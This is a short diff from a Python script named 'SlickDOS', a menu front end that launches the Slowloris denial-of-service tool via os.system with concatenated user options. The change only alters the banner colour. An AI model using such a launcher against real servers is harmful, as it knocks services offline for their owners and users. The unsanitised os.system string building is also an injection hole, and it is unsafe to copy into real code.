@@ -62,7 +62,7 @@ def Slowloris1():
 
     os.system('slowloris ' + verbose + ' ' + port + ' ' + sockets + ' ' + ua + ' ' + use_proxy + ' ' + phost + ' ' + pport + ' ' + https + ' ' + sleeptime + ' ' + host)
 
-print(f'{Fore.RED}{Back.BLACK} {(text2art("SLICKDOS", "random-medium"))} {Style.RESET_ALL}{Fore.RED}' )
+print(f'{Fore.RED}{(text2art("SLICKDOS", "random-medium"))} {Style.RESET_ALL}{Fore.RED}' )
 print(f"{Style.RESET_ALL}Welcome to SlickDOS the DOS Thingamajig!")
 time.sleep(0.2)
 print(f"{Fore.LIGHTBLUE_EX}[1] Slowloris (Low bandwith Attack) \n[2] Exit{Fore.YELLOW}")
